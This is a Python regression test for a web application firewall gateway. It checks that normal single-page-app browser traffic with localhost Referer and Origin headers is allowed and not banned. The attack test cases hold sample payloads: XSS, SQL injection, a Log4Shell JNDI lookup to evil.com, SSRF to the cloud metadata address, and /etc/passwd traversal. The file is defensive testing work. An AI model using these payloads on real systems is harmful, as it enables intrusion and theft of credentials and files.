"""Real browser traffic must pass; real attacks in the same places must still be caught.
Regression test for: 'opening the site through the gateway got my IP banned' (Referer/Origin
containing the site's own 127.0.0.1 address was flagged as SSRF).
Run:  python tests/test_real_browser_traffic.py"""
import json
import os
import sys
import tempfile
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)
_tmp = tempfile.mkdtemp()
from src.hybrid_waf.utils import event_store  # noqa: E402
event_store.DB_PATH = type(event_store.DB_PATH)(os.path.join(_tmp, "t.db"))
from src.hybrid_waf.gateway import create_gateway_app  # noqa: E402
from src.hybrid_waf.utils.request_inspector import inspect_request  # noqa: E402
from src.hybrid_waf.utils.signature_checker import inspect  # noqa: E402
from src.hybrid_waf.utils.traffic_control import get_controller  # noqa: E402

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
      "Chrome/141.0.0.0 Safari/537.36")
BASE = {"User-Agent": UA, "Accept": "*/*", "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br", "sec-ch-ua": '"Chromium";v="141", "Not?A_Brand";v="8"',
        "Sec-Fetch-Mode": "cors"}
COOKIE = "language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=KQabcDEF12xyz34QWERtyui56"
JWT = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIn0.abc-def_ghi"
SELF = ("http://127.0.0.1:8080/", "http://localhost:8080/", "http://127.0.0.1:3000/", "http://[::1]:8080/")

# (path, query, extra headers): what a single-page app does while loading and being used
PAGE_LOAD = [
    ("/", "", {}),
    ("/main.js", "", {}), ("/runtime.js", "", {}), ("/styles.css", "", {}),
    ("/rest/admin/application-configuration", "", {"Cookie": COOKIE}),
    ("/api/Challenges/", "name=Score%20Board", {"Cookie": COOKIE}),
    ("/socket.io/", "EIO=4&transport=polling&t=Ox3-Hp_", {"Cookie": COOKIE}),
    ("/rest/products/search", "q=", {"Cookie": COOKIE}),
    ("/rest/user/whoami", "", {"Cookie": COOKIE + "; token=" + JWT}),
    ("/assets/public/images/products/apple_juice.jpg", "", {}),
    ("/api/Quantitys/", "", {"Origin": "ORIGIN"}),
]


def _headers(extra, referer):
    h = {**BASE, "Referer": referer}
    for k, v in extra.items():
        h[k] = referer.rstrip("/") if v == "ORIGIN" else v
    return h


def test_page_load_is_never_blocked_for_any_local_address():
    for referer in SELF:
        for path, query, extra in PAGE_LOAD:
            r = inspect_request(method="GET", path=path, query=query, headers=_headers(extra, referer),
                                body=b"", ml_predict=lambda *a: False)
            assert r["action"] == "allow", (referer, path, r["rule_id"], r["location"])


def test_real_attacks_are_still_caught_in_those_same_headers():
    attacks = {
        ("Referer", "http://127.0.0.1:8080/<script>alert(1)</script>"): "XSS",
        ("Referer", "http://example.com/?q=' OR '1'='1'--"): "SQLi",
        ("Origin", "http://127.0.0.1/${jndi:ldap://evil.com/a}"): "Log4Shell",
        ("Referer", "http://127.0.0.1/../../etc/passwd"): "Path Traversal",
    }
    for (name, value), category in attacks.items():
        r = inspect_request(method="GET", path="/", query="", headers={**BASE, name: value},
                            body=b"", ml_predict=lambda *a: False)
        assert r["action"] == "block" and r["category"] == category, (name, value, r)


def test_ssrf_is_still_caught_where_it_belongs():
    for query, body in (("url=http://127.0.0.1:8080/admin", b""),
                        ("", b'{"avatar": "http://169.254.169.254/latest/meta-data/"}'),
                        ("", b"image=file:///etc/passwd"),
                        ("next=http://localhost/internal", b"")):
        r = inspect_request(method="POST", path="/profile", query=query, headers=BASE, body=body,
                            ml_predict=lambda *a: False)
        assert r["action"] == "block" and r["category"] in ("SSRF", "Path Traversal"), (query, body, r)
    assert inspect("http://127.0.0.1/x")["category"] == "SSRF"       # engine default is unchanged
    assert inspect("http://127.0.0.1/x", exclude_categories=("SSRF",))["verdict"] == "valid"


class _Backend(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.send_header("Content-Length", "2"); self.end_headers(); self.wfile.write(b"ok")
    def log_message(self, *a): pass


def test_gateway_serves_a_full_browsing_session_without_banning():
    srv = ThreadingHTTPServer(("127.0.0.1", 0), _Backend)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    ctl = get_controller()
    ctl._bans.clear(); ctl._attacks.clear(); ctl._requests.clear()
    ctl.cfg["proxy"].update(backend_url=f"http://127.0.0.1:{srv.server_address[1]}", mode="block",
                            ml_on_obfuscated=False, log_allowed=True)
    ctl.cfg["proxy_rate_limit"].update(max_requests=300, window_seconds=60)
    app = create_gateway_app(ml_predict=lambda *a: False)
    app.config["TESTING"] = True
    c = app.test_client()
    codes = []
    for _ in range(5):                                       # five full page loads in a row
        for path, query, extra in PAGE_LOAD:
            extra = {k: v for k, v in extra.items() if k != "Cookie"}   # test client drops Cookie headers
            url = path + ("?" + query if query else "")
            codes.append(c.get(url, headers=_headers(extra, "http://127.0.0.1:8080/"),
                               environ_overrides={"REMOTE_ADDR": "198.51.100.20"}).status_code)
    assert codes == [200] * len(codes), {x: codes.count(x) for x in set(codes)}
    assert not ctl.active_bans()
    srv.shutdown()


if __name__ == "__main__":
    fails = 0
    for name, fn in list(globals().items()):
        if name.startswith("test_"):
            try:
                fn(); print("PASS", name)
            except Exception as e:
                fails += 1; print("FAIL", name, type(e).__name__, e)
    sys.exit(1 if fails else 0)
